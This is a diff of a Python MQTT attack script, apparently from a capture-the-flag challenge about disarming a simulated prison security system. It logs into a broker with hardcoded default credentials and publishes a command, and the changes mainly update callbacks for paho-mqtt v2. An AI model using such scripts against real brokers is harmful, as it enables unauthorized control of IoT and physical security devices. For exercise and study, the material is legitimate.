@@ -17,16 +17,10 @@ BROKER_PORT = 1883
 MQTT_USERNAME = "iotuser"     # Username for MQTT
 MQTT_PASSWORD = "iot"         # Password for MQTT
 
-# --- Flag Verification Setup (Not used in this version, but kept for context) ---
-# FLAG_CHANNEL_TOPIC = "prison/system/flag_channel"
-# SUCCESS_FLAG_PAYLOAD = "{{SECURITY-DISARMED}}"
-# WAIT_TIMEOUT = 10 # Seconds to wait for the flag confirmation
-
-# --- Global flag for confirmation (Not used in this version) ---
-# confirmation_event = threading.Event() # Not needed
-
 # --- MQTT Callbacks ---
-def on_connect(client, userdata, flags, rc):
+# *** MODIFIED on_connect signature ***
+def on_connect(client, userdata, flags, rc, properties=None):
+    """Callback for connection results."""
     if rc == 0:
         print(f"[+] Connected successfully to MQTT broker: {BROKER_HOST}")
         # Immediately try to publish after connecting
@@ -42,13 +36,16 @@ def on_connect(client, userdata, flags, rc):
         sys.exit(1) # Exit script if connection fails
 
 def on_publish(client, userdata, mid):
+    """Callback when publish completes (for QoS > 0)."""
     print(f"[+] Command '{COMMAND_PAYLOAD}' successfully published to '{TARGET_TOPIC}' (MID: {mid}).")
     print("[*] Check the hidden website for status change!")
     # Disconnect after successful publish
     time.sleep(0.5) # Short delay to ensure message is likely sent by broker
     client.disconnect() # This will eventually stop loop_forever
 
-def on_disconnect(client, userdata, rc):
+# *** MODIFIED on_disconnect signature (less common change, but good practice) ***
+def on_disconnect(client, userdata, rc, properties=None):
+    """Callback for disconnections."""
      # This is called both on intentional disconnect and errors
      if rc == 0:
          print("[*] MQTT connection closed gracefully.")
@@ -87,11 +84,8 @@ if __name__ == "__main__":
     print(f"[*] Command Payload:  {COMMAND_PAYLOAD}")
 
     # Use the correct callback API version
-    # If using paho-mqtt v2.0.0 or later, use: mqtt.CallbackAPIVersion.VERSION2
-    # If using older versions (like 1.x), use: mqtt.CallbackAPIVersion.VERSION1
-    # Add this check or specify the version if you know it:
     try:
-        # Attempt to use V2 first (for newer paho-mqtt)
+        # Specify V2 explicitly for newer paho-mqtt
         client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"attacker-lightsout-{time.time()}")
     except AttributeError:
         # Fallback to V1 if V2 is not available (older paho-mqtt)
@@ -120,12 +114,8 @@ if __name__ == "__main__":
         print(f"\n[!] An unexpected error occurred: {e}")
     finally:
         print("[*] Cleaning up MQTT connection (if loop stopped)...")
-        # Ensure loop is stopped WITHOUT the 'force' argument
-        # Check if loop_stop is needed (loop_forever usually exits on disconnect)
         try:
-            # loop_stop should ideally not be needed after loop_forever exits due to disconnect
-            # but call it just in case to be safe, ignore errors if already stopped.
-             client.loop_stop() # REMOVED force=True
+             client.loop_stop()
         except Exception as stop_err:
-            pass # Ignore potential errors if loop already stopped.
+            pass
         print("[*] Script finished.")
